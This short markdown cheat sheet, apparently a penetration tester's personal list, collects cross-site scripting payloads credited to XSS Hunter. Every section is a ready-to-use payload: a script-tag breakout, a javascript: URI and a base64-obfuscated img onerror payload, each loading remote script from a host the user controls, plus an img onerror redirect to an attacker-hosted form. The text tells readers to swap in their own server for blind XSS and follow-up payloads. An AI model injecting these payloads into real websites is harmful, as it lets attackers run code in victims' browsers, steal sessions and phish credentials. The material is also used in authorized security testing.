# A Few of My Favorite XSS Payloads: 

Most of these are from or variations of [XSS Hunter]{https://xsshunter.com/app} payloads. 
You can simply modify the host in the payload and run your own web server to both host secondary payloads and check for blind XSS.

##Basic Tag XSS payload -
```
"><script src=http://192.168.1.1></script>
```
##URI XSS payload - 
```
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://192.168.1.1\';document.body.appendChild(a)')
```
##IMG Tag Base64 encoded payload - 

Final payload - (don't use this directly, follow the directions below. This is just an example)
```
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHA6Ly8xOTIuMTY4LjEuMSI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>
```

Inner payload - modify your IP address then base64 encode this.
```
var a=document.createElement("script");a.src="http://192.168.1.1";document.body.appendChild(a);
```

##IMG Tag + iframe to replace page with your own HTML form - 
```
<img src=x onerror="Javascript:window.location.replace('http://192.168.1.1/payload.html')">
```




